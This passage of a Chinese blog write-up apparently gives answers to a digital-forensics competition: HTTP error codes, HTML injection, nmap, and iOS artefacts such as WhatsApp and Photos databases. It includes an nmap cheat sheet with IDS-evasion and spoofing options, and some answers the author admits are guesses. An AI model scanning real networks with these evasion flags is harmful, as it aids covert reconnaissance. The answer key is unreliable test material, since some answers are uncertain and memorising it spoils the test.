Gateway</h4><p>该扮演网关或代理角色的服务器从上游服务器中接收到的响应是无效的。注意，502 错误通常不是客户端能够修复的，而是需要由途经的服务器或者代理服务器对其进行修复</p><h4 id="4503-service-unavailable"><a class="markdownIt-Anchor" href="#4503-service-unavailable">#</a> （4）503 Service Unavailable</h4><p>服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p><p><strong>使用场景：</strong></p><ul><li>服务器停机维护时，主动用 503 响应请求；</li><li>nginx 设置限速，超过限速，会返回 503。</li></ul><h4 id="5504-gateway-timeout"><a class="markdownIt-Anchor" href="#5504-gateway-timeout">#</a> （5）504 Gateway Timeout</h4><p>网关或者代理的服务器无法在规定的时间内获得想要的响应。它是 HTTP 1.1 中新加入的。</p><p><strong>使用场景：</strong></p><ul><li>代码执行时间超时；</li><li>代码发生了死循环。</li></ul><h4 id="6505-http-version-not-supported"><a class="markdownIt-Anchor" href="#6505-http-version-not-supported">#</a> （6）505 HTTP Version Not Supported</h4><p>请求中使用的 HTTP 版本不受服务器支持。</p><h4 id="7506-variant-also-negotiates"><a class="markdownIt-Anchor" href="#7506-variant-also-negotiates">#</a> （7）506 Variant Also Negotiates</h4><p>服务器内部配置错误。</p><h4 id="8507-insufficient-storage"><a class="markdownIt-Anchor" href="#8507-insufficient-storage">#</a> （8）507 Insufficient Storage</h4><p>服务器无法存储完成请求所必须的内容。</p><h4 id="9508-loop-detected"><a class="markdownIt-Anchor" href="#9508-loop-detected">#</a> （9）508 Loop Detected</h4><p>服务器在处理请求时检测到无限循环。</p><h4 id="10510-not-extended"><a class="markdownIt-Anchor" href="#10510-not-extended">#</a> （10）510 Not Extended</h4><p>服务器需要进一步扩展才能满足请求。</p><h4 id="11511-network-authentication-required"><a class="markdownIt-Anchor" href="#11511-network-authentication-required">#</a> （11）511 Network Authentication Required</h4><p>客户端需要进行身份验证才能获得访问权限。</p></blockquote><h5 id="48-单选题-在html注入攻击中以下哪种情况最有可能出现1分"><a class="markdownIt-Anchor" href="#48-单选题-在html注入攻击中以下哪种情况最有可能出现1分">#</a> 48. [单选题] 在 HTML 注入攻击中，以下哪种情况最有可能出现？(1 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca35.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a35"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>答案是 A，还需要学习，gpt 一下了解一下用途吧</p><p>A. 这个表单指向一个外部地址，可能被用来进行 <strong>钓鱼攻击</strong>（Phishing）。不过，它不涉及直接的 HTML 注入。</p><p>B. 这条代码嵌入了一个外部的 Flash 文件。虽然 Flash 文件本身可能有漏洞，但与 HTML 注入攻击无关。</p><p>C. 这一段代码插入了一段 JavaScript 脚本。这种注入是典型的 <strong>XSS (跨站脚本攻击)</strong>，属于 HTML 注入攻击的常见方式。</p><p>D. 这一行 PHP 代码涉及文件包含，可能会导致文件包含漏洞，但和 HTML 注入无关。</p><h5 id="49-单选题-如何预防html注入攻击1分"><a class="markdownIt-Anchor" href="#49-单选题-如何预防html注入攻击1分">#</a> 49. [单选题] 如何预防 HTML 注入攻击？(1 分)</h5><p>A. 密钥管理</p><p>B. 同源策略执行</p><p>C. 会话验证</p><p>D. 输入过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p>和防御 sql 注入一个道理，过滤输入的内容是最直接最有效的方法</p><h5 id="50-单选题-同源策略在浏览器内存中提供web应用程序安全的目的是什么3分"><a class="markdownIt-Anchor" href="#50-单选题-同源策略在浏览器内存中提供web应用程序安全的目的是什么3分">#</a> 50. [单选题] 同源策略在浏览器内存中提供 Web 应用程序安全的目的是什么？(3 分)</h5><p>A. 防止客户端访问恶意网站</p><p>B. 禁止 Web 会话运行外部脚本</p><p>C. 控制来自不同服务器的代码之间的交互</p><p>D. 阻止浏览器运行危险或有害的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><blockquote><p>同源策略（Same-Origin Policy）是浏览器中的一种重要安全机制，其主要目的是<strong>保护 Web 应用程序的数据安全，防止不同来源的资源相互访问</strong>，从而防止跨站点脚本攻击（XSS）、跨站点请求伪造（CSRF）等常见的网络攻击。具体来说，同源策略通过以下方式提升 Web 应用的安全性：</p><ol><li><strong>防止未经授权的跨站请求</strong>：同源策略限制了网页中 JavaScript 只能访问同源（协议、主机名和端口相同）的资源，防止了恶意网站在用户不知情的情况下向其他站点发起请求，盗取用户的敏感信息。</li><li><strong>保护用户的会话数据</strong>：不同来源的站点无法直接访问彼此的 Cookie、LocalStorage 或其他存储在浏览器内存中的数据，这有助于保护用户的会话信息，避免恶意站点利用这些信息冒充用户身份。</li><li><strong>防止数据泄露</strong>：通过限制跨域资源的访问，同源策略可以确保用户的敏感数据不会被恶意站点读取或劫持，减少数据泄露的风险。</li></ol><h3 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h3><p>同源策略通过强制网页只能访问同源资源来提高 Web 应用的安全性，保护用户的敏感数据不被跨域的恶意站点获取。</p></blockquote><h5 id="51-填空题-编写nmap命令以显示以下结果-2分"><a class="markdownIt-Anchor" href="#51-填空题-编写nmap命令以显示以下结果-2分">#</a> 51. [填空题] 编写 Nmap 命令以显示以下结果。(2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca36.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca36.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a36"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script http-robots.txt www.baidu.com</span><br></pre></td></tr></table></figure><blockquote><p>nmap 常用命令<br>主机发现</p><p>iR                                                                随机选择目标</p><p>-iL                                                                从文件中加载 IP 地址</p><p>-sL                                                               简单的扫描目标</p><p>-sn                                                               Ping 扫描 - 禁用端口扫描</p><p>-Pn                                                              将所有主机视为在在线，跳过主机发现</p><p>-PS [portlist]                                              （TCP SYN ping） 需要 root 权限</p><p>-PA[portlist]                                              （TCP ACK ping）</p><p>-PU[portlist]                                              （UDP  ping）</p><p>-PY [portlist]                                             （SCTP ping）</p><p>-PE/PP/PM                                                 ICMP 回显，时间戳和网络掩码请求探测</p><p>-PO [协议列表]                                            IP 协议 Ping</p><p>-n/-R                                                           从不执行 DNS 解析 / 始终解析 [默认：有时]</p><p>–dns-servers                                              指定自定义 DNS 服务器</p><p>–system-dns                                              使用 OS 的 dns 服务器</p><p>–traceroute                                                跟踪到每个主机的跃点路径</p><p>扫描技术</p><p>-sS                                                             使用 TCP 的 SYN 进行扫描</p><p>-sT                                                             使用 TCP 进行扫描</p><p>-sA                                                            使用 TCP 的 ACK 进行扫描</p><p>-sU                                                            UDP 扫描</p><p>-sI                                                             Idle 扫描</p><p>-sF                                                            FIN 扫描</p><p>-b&lt;FTP 中继主机&gt;                                     FTP 反弹扫描</p><p>端口规格和扫描顺序</p><p>-p                                                              扫描指定端口</p><p>–exclude-ports                                         从扫描中排除指定端口</p><p>-f                                                               快速模式 - 扫描比默认扫描更少的端口</p><p>-r                                                               连续扫描端口 - 不随机化</p><p>–top-ports                                                 扫描<number>最常用的端口</number></p><p>服务 / 版本探测</p><p>-sV                                                            探测服务 / 版本信息</p><p>–version-intensity                                     设置版本扫描强度（0-9）</p><p>–version-all                                              尝试每个强度探测</p><p>–version-trace                                          显示详细的版本扫描活动（用于调试）</p><p>脚本扫描</p><p>-SC                                                           等效于 --script=defult</p><p>–script = <lua scripts>,<lua scripts>        以逗号分隔的目录，脚本文件或脚本类别</lua></lua></p><p>–script-args = &lt;n1=v1, n2=v2&gt;               为脚本提供参数</p><p>–script-args-file = 文件名                          从文件名中加载脚本参数</p><p>–script-trace                                            显示发送和接受的所有数据</p><p>–script-updatedb                                     更新脚本数据库</p><p>–script-help=<lua scripts>                      显示有关脚本的帮助</lua></p><p>操作系统检测</p><p>-o                                                            启用 os 检测</p><p>–osscan-limit                                          将 os 检测限制为可能的目标</p><p>–osscan-guess                                       推测操作系统检测结果</p><p>时间和性能</p><p>–host-timeout                                         设置超时时间</p><p>–scan-delay                                           设置探测之间的时间间隔</p><p>-T  &lt;0-5&gt;                                                设置时间模板，值越小，IDS 报警几率越低</p><p>防火墙 / IDS 规避和欺骗</p><p>-f                                                             报文分段</p><p>-s                                                             欺骗源地址</p><p>-g                                                            使用指定的本机端口</p><p>–proxies &lt;url,port&gt;                                 使用 HTTP/SOCK4 代理</p><p>-data<hex string>                                   想发送的数据包中追加自定义的负载</hex></p><p>–data-string                                            将自定义的 ACSII 字符串附加到发送数据包中</p><p>–data-length                                           发送数据包时，附加随机数据</p><p>–spoof-mac                                            MAC 地址欺骗</p><p>–badsum                                                发送带有虚假 TCP/UNP/STCP 校验和的数据包</p><p>输出</p><p>-oN                                                         标准输出</p><p>-oX                                                         XMl 输出</p><p>-oS                                                         script jlddi3</p><p>-oG                                                        grepable</p><p>-oA                                                         同时输出三种主要格式</p><p>-v                                                           信息详细级别</p><p>-d                                                           调试级别</p><p>–packet-trace                                        跟踪发送和接收的报文</p><p>–reason                                                 显示端口处于特殊状态的原因</p><p>–open                                                    仅显示开放的端口</p><p>杂项</p><p>-6                                                          启动 Ipv6 扫描</p><p>-A                                                          启动 Os 检测，版本检测，脚本扫描和 traceroute</p><p>-V                                                          显示版本号</p><p>-h                                                          帮助信息</p></blockquote><h5 id="52-填空题-除了使用nmap还有其他方法可以验证上述结果其中一种方法是使用web浏览器浏览url编写url以显示上述结果-答案不要包含http2分"><a class="markdownIt-Anchor" href="#52-填空题-除了使用nmap还有其他方法可以验证上述结果其中一种方法是使用web浏览器浏览url编写url以显示上述结果-答案不要包含http2分">#</a> 52. [填空题] 除了使用 Nmap，还有其他方法可以验证上述结果，其中一种方法是使用 Web 浏览器浏览 URL，编写 URL 以显示上述结果。（答案不要包含 “http://”）(2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure><h5 id="53-单选题-根据-comappleiosstorekituiserviceplist-这部电话是什么型号1分"><a class="markdownIt-Anchor" href="#53-单选题-根据-comappleiosstorekituiserviceplist-这部电话是什么型号1分">#</a> 53. [单选题] 根据 ’ com.apple.ios.StoreKitUIService.plist ’ , 这部电话是什么型号？(1 分)</h5><p>A. SAMSUNG S23<br>B. iPhone X<br>C. iPhone XR<br>D. iPhone XS<br>E. iPhone 13</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca47.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca47.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a47"></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca48.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca48.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a48"></p><h5 id="54-单选题-根据comappleiosstorekituiserviceplist上述电话的文件系统是什么1分"><a class="markdownIt-Anchor" href="#54-单选题-根据comappleiosstorekituiserviceplist上述电话的文件系统是什么1分">#</a> 54. [单选题] 根据 com.apple.ios.StoreKitUIService.plist，上述电话的文件系统是什么？(1 分)</h5><p>A. FAT32</p><p>B. NTFS</p><p>C. HFS+</p><p>D. APFS</p><p>E. EXT4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca49.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca49.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a49"></p><h5 id="55-多选题-根据chatstoragesqlite哪些对话已锁定3分"><a class="markdownIt-Anchor" href="#55-多选题-根据chatstoragesqlite哪些对话已锁定3分">#</a> 55. [多选题] 根据 ChatStorage.sqlite，哪些对话已锁定？(3 分)</h5><p>A. 447380449879@.whatsapp.net<br>B. 79096209701@.whatsapp.net<br>C. 923109725619@.whatsapp.net<br>D. 85256026169@.whatsapp.net<br>E. status@broadcast</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABC</span><br></pre></td></tr></table></figure><p>打开查看 ZWACHATSESSION，CHATSESSION 就是存储对话的表，里面有三个账号的 FLAGS 值相比其他账号大上不少，猜测是锁定的意思</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca50.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca50.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a50"></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca51.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca51.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a51"></p><h5 id="56-填空题-根据chatstoragesqlite有多少段录音对话提示-请以阿拉伯数字作答-2分"><a class="markdownIt-Anchor" href="#56-填空题-根据chatstoragesqlite有多少段录音对话提示-请以阿拉伯数字作答-2分">#</a> 56. [填空题] 根据 ChatStorage.sqlite，有多少段录音对话？提示：请以阿拉伯数字作答 (2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca52.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca52.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a52"></p><p>看 ogg 文件</p><h5 id="57-单选题-apple-cocoa-core-data-timestamp-是由什么时间开始1分"><a class="markdownIt-Anchor" href="#57-单选题-apple-cocoa-core-data-timestamp-是由什么时间开始1分">#</a> 57. [单选题] Apple Cocoa Core Data timestamp 是由什么时间开始？(1 分)</h5><p>A. 2001 年 1 月 1 日</p><p>B. 1970 年 1 月 1 日</p><p>C. 2006 年 1 月 1 日</p><p>D. 1960 年 1 月 1 日</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>Core Data 时间戳的起始日期是 2001 年 1 月 1 日</p><h5 id="58填空题-根据photossqlite数据库中有多少段视频可能涉及whatsapp提示-请以阿拉伯数字作答-2分"><a class="markdownIt-Anchor" href="#58填空题-根据photossqlite数据库中有多少段视频可能涉及whatsapp提示-请以阿拉伯数字作答-2分">#</a> 58.[填空题] 根据 Photos.sqlite 数据库中，有多少段视频可能涉及 WhatsApp？提示：请以阿拉伯数字作答 (2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><p>可以使用 sql 语句查询</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca53.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca53.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a53"></p><p>也可以直接找，在 ZIMPORTEDBYBUNDLEIDENTIFIER 过滤 WhatsApp，在 ZORIGINALFILENAME 过滤 mp4</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca54.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a54"></p><h5 id="59-多选题-根据photossqlite数据库中下列哪个选项对img_0008heic的描述是错的3分"><a class="markdownIt-Anchor" href="#59-多选题-根据photossqlite数据库中下列哪个选项对img_0008heic的描述是错的3分">#</a> 59. [多选题] 根据 Photos.sqlite 数据库中，下列哪个选项对 IMG_0008.HEIC 的描述是错的？(3 分)</h5><p>A. 由第三方软件拍摄</p><p>B. 经过修改</p><p>C. 由后镜拍摄</p><p>D. 用 ISO200 拍摄</p><p>E. 没有储存经纬度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCD</span><br></pre></td></tr></table></figure><p>表示实在是不会做，跟着师傅们的 wp 是选 ADE</p><p>在 ZASSET 表和 ZEXTENDEDATTRIBUTES 中可以找到一些有用的，ZASSET 表搜索 IMG_0008.HEIC，记录 pk 值 491</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca55.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca55.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a55"></p><p>在表 ZEXTENDEDATTRIBUTES 中，过滤 491</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca56.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca56.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a56"></p><p>可以看到经纬度、本机拍照、后置摄像头</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca57.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca57.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a57"></p><p>iso160</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca58.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca58.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a58"></p><h5 id="60-填空题-根据-smsiosdb-的资料全局唯一标识符guid-dd31c26f-1d72-de0f-431e-ef98f104402d显示的信息是什么提示答案需要与信息一样答案包括中文字-阿拉伯数字与符号-1分"><a class="markdownIt-Anchor" href="#60-填空题-根据-smsiosdb-的资料全局唯一标识符guid-dd31c26f-1d72-de0f-431e-ef98f104402d显示的信息是什么提示答案需要与信息一样答案包括中文字-阿拉伯数字与符号-1分">#</a> 60. [填空题] 根据 ’ sms (ios).db ’ 的资料，全局唯一标识符 (GUID): DD31C26F-1D72-DE0F-431E-EF98F104402D 显示的信息是什么？提示：答案需要与信息一样 (答案包括中文字、阿拉伯数字与符号) (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你的 Uber 驗證碼為 3666. 請勿分享此驗證碼. </span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca59.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca59.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a59"></p><h5 id="61-多选题-根据-comburbninstagramplist-及-comfacebookfacebookplist-手机安装了实时通讯软件facebook及instagram的那个版本1分"><a class="markdownIt-Anchor" href="#61-多选题-根据-comburbninstagramplist-及-comfacebookfacebookplist-手机安装了实时通讯软件facebook及instagram的那个版本1分">#</a> 61. [多选题] 根据 ’ com.burbn.instagram.plist ’ 及 ’ com.facebook.Facebook.plist ’ 手机安装了实时通讯软件 Facebook 及 Instagram 的那个版本？(1 分)</h5><p>A. Instagram (Version 278.0.0.19.115)<br>B. Facebook (Version 410.0.0.41.116)<br>C. Instagram (Version 279.0.0.23.112)<br>D. Facebook (Version 410.0.0.26.115)<br>E. Instagram (Version 278.0.0.25.115)<br>F. Facebook (Version 410.0.0.57.116)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AB</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca61.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca61.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a61"></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca60.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca60.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a60"></p><h5 id="62-填空题-根据-chatstorageiossqlite-用户数据peter-chow-85262012141在什么日期和时间以utc-8时区曾经通过实时通讯软件送出一个信息内容为-i-am-already-home-提示以utc-8时区作答并以yyyy-mm-dd_hhmmss格式作答-例如2023-01-01_100101-答案无需输入utc-8-2分"><a class="markdownIt-Anchor" href="#62-填空题-根据-chatstorageiossqlite-用户数据peter-chow-85262012141在什么日期和时间以utc-8时区曾经通过实时通讯软件送出一个信息内容为-i-am-already-home-提示以utc-8时区作答并以yyyy-mm-dd_hhmmss格式作答-例如2023-01-01_100101-答案无需输入utc-8-2分">#</a> 62. [填空题] 根据 ’ ChatStorage (ios).sqlite ’ , 用户数据 Peter Chow (85262012141) 在什么日期和时间 (以 UTC +8 时区) 曾经通过实时通讯软件送出一个信息 (内容为: I am already home)? 提示：以 UTC +8 时区作答，并以 YYYY-MM-DD_HH:MM:SS 格式作答 例如：2023-01-01_10:01:01 (答案无需输入 UTC +8) (2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023-04-01 11:21:51</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca62.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca62.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a62"></p><p>先换算出 2001.1.1 的时间戳 978307200</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca63.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca63.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a63"></p><h5 id="63-填空题-根据影片img_0687mov的原数据找出影片拍摄时间提示以utc-8时区作答并以yyyy-mm-dd_hhmmss格式作答-例如2023-01-01_100101-答案无需输入utc-8-1分"><a class="markdownIt-Anchor" href="#63-填空题-根据影片img_0687mov的原数据找出影片拍摄时间提示以utc-8时区作答并以yyyy-mm-dd_hhmmss格式作答-例如2023-01-01_100101-答案无需输入utc-8-1分">#</a> 63. [填空题] 根据影片 IMG_0687.MOV 的原数据，找出影片拍摄时间？提示：以 UTC +8 时区作答，并以 YYYY-MM-DD_HH:MM:SS 格式作答 例如：2023-01-01_10:01:01 (答案无需输入 UTC +8) (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023-06-06_18:11:29</span><br></pre></td></tr></table></figure><p>不会。。。</p><h5 id="64-单选题-根据-callhistoryiosstoredata-哪份表格显示了通话记录2分"><a class="markdownIt-Anchor" href="#64-单选题-根据-callhistoryiosstoredata-哪份表格显示了通话记录2分">#</a> 64. [单选题] 根据 ’ CallHistory (ios).storedata '，哪份表格显示了通话记录？(2 分)</h5><p>A. ZCALLBPROPERTIES<br>B. ZCALLRECORD<br>C. Z_2REMOTEPARTICIPANTHANDLES<br>D. Z_METADATA<br>E. Z_MODELCACHE<br>F. Z_PRIMARYKEY</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca64.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca64.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h5 id="65-填空题-根据-comapplesharingdplist-这部手机的隔空投送的身份标识号airdrop-id是什么提示请以阿拉伯数字与小写字母作答-3分"><a class="markdownIt-Anchor" href="#65-填空题-根据-comapplesharingdplist-这部手机的隔空投送的身份标识号airdrop-id是什么提示请以阿拉伯数字与小写字母作答-3分">#</a> 65. [填空题] 根据 ’ com.apple.sharingd.plist '，这部手机的隔空投送的身份标识号 (AirDrop ID) 是什么？提示：请以阿拉伯数字与小写字母作答 (3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2abd0940fbdc</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca65.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca65.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a65"></p><h5 id="66-填空题-根据-accounts3sqlite-这部手机的苹果使用者账号-apple-id-是什么提示请以电邮格式作答例jack2023hotmailcom-2分"><a class="markdownIt-Anchor" href="#66-填空题-根据-accounts3sqlite-这部手机的苹果使用者账号-apple-id-是什么提示请以电邮格式作答例jack2023hotmailcom-2分">#</a> 66. [填空题] 根据 ’ Accounts3.sqlite '，这部手机的苹果使用者账号 (Apple ID) 是什么？提示：请以电邮格式作答 (例:jack2023@hotmail.com) (2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foratcd2023@gmail.com</span><br></pre></td></tr></table></figure><p><img 